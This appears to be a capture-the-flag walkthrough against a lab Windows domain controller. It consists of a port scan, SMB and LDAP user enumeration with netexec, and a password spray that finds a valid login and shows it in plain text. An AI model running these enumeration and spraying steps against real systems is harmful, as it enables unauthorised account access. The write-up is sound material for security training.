## STEP 1
```sh
└─$ rustscan -a 10.129.188.71 --no-banner --scripts none
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.188.71:53
Open 10.129.188.71:88
Open 10.129.188.71:135
Open 10.129.188.71:139
Open 10.129.188.71:389
Open 10.129.188.71:445
Open 10.129.188.71:636
Open 10.129.188.71:3268
Open 10.129.188.71:3269
Open 10.129.188.71:5985
Open 10.129.188.71:49154
Open 10.129.188.71:49155
Open 10.129.188.71:49158
Open 10.129.188.71:49157
Open 10.129.188.71:49163
10.129.188.71 -> [53,88,135,139,389,445,636,3268,3269,5985,49154,49155,49158,49157,49163]
```


## STEP 2
```sh
└─$ netexec smb 10.129.188.71 --users                                    
SMB         10.129.188.71   445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False) 
SMB         10.129.188.71   445    CASC-DC1         -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.188.71   445    CASC-DC1         CascGuest                     <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.129.188.71   445    CASC-DC1         arksvc                        2020-01-09 16:18:20 0        
SMB         10.129.188.71   445    CASC-DC1         s.smith                       2020-01-28 19:58:05 0        
SMB         10.129.188.71   445    CASC-DC1         r.thompson                    2020-01-09 19:31:26 0        
SMB         10.129.188.71   445    CASC-DC1         util                          2020-01-13 02:07:11 0        
SMB         10.129.188.71   445    CASC-DC1         j.wakefield                   2020-01-09 20:34:44 0        
SMB         10.129.188.71   445    CASC-DC1         s.hickson                     2020-01-13 01:24:27 0        
SMB         10.129.188.71   445    CASC-DC1         j.goodhand                    2020-01-13 01:40:26 0        
SMB         10.129.188.71   445    CASC-DC1         a.turnbull                    2020-01-13 01:43:13 0        
SMB         10.129.188.71   445    CASC-DC1         e.crowe                       2020-01-13 03:45:02 0        
SMB         10.129.188.71   445    CASC-DC1         b.hanson                      2020-01-13 16:35:39 0        
SMB         10.129.188.71   445    CASC-DC1         d.burman                      2020-01-13 16:36:12 0        
SMB         10.129.188.71   445    CASC-DC1         BackupSvc                     2020-01-13 16:37:03 0        
SMB         10.129.188.71   445    CASC-DC1         j.allen                       2020-01-13 17:23:59 0        
SMB         10.129.188.71   445    CASC-DC1         i.croft                       2020-01-15 21:46:21 0        
SMB         10.129.188.71   445    CASC-DC1         [*] Enumerated 15 local users: CASCADE
```
```sh
└─$ netexec ldap 10.129.188.71 --active-users                  
LDAP        10.129.188.71   389    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 (name:CASC-DC1) (domain:cascade.local)
LDAP        10.129.188.71   389    CASC-DC1         [*] Total records returned: 15, total 4 user(s) disabled
LDAP        10.129.188.71   389    CASC-DC1         -Username-                    -Last PW Set-       -BadPW-  -Description-                                                                                                            
LDAP        10.129.188.71   389    CASC-DC1         arksvc                        2020-01-09 11:18:20 15       
LDAP        10.129.188.71   389    CASC-DC1         s.smith                       2020-01-28 14:58:05 15       
LDAP        10.129.188.71   389    CASC-DC1         r.thompson                    2020-01-09 14:31:26 15       
LDAP        10.129.188.71   389    CASC-DC1         util                          2020-01-12 21:07:11 15       
LDAP        10.129.188.71   389    CASC-DC1         j.wakefield                   2020-01-09 15:34:44 15       
LDAP        10.129.188.71   389    CASC-DC1         s.hickson                     2020-01-12 20:24:27 14       
LDAP        10.129.188.71   389    CASC-DC1         j.goodhand                    2020-01-12 20:40:26 15       
LDAP        10.129.188.71   389    CASC-DC1         a.turnbull                    2020-01-12 20:43:13 15       
LDAP        10.129.188.71   389    CASC-DC1         d.burman                      2020-01-13 11:36:12 15       
LDAP        10.129.188.71   389    CASC-DC1         BackupSvc                     2020-01-13 11:37:03 15       
LDAP        10.129.188.71   389    CASC-DC1         j.allen                       2020-01-13 12:23:59 15
```
```sh
└─$ netexec ldap 10.129.188.71 --password-not-required
LDAP        10.129.188.71   389    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 (name:CASC-DC1) (domain:cascade.local)
LDAP        10.129.188.71   389    CASC-DC1         User: a.turnbull Status: enabled
LDAP        10.129.188.71   389    CASC-DC1         User: CascGuest Status: disabled
```
```sh
┌──(kali㉿kali)-[~]
└─$ netexec smb 10.129.188.71 -u userall.txt  -p 'rY4n5eva'     
SMB         10.129.188.71   445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.188.71   445    CASC-DC1         [-] cascade.local\CascGuest:rY4n5eva STATUS_LOGON_FAILURE 
SMB         10.129.188.71   445    CASC-DC1         [-] cascade.local\arksvc:rY4n5eva STATUS_LOGON_FAILURE 
SMB         10.129.188.71   445    CASC-DC1         [-] cascade.local\s.smith:rY4n5eva STATUS_LOGON_FAILURE 
SMB         10.129.188.71   445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
```
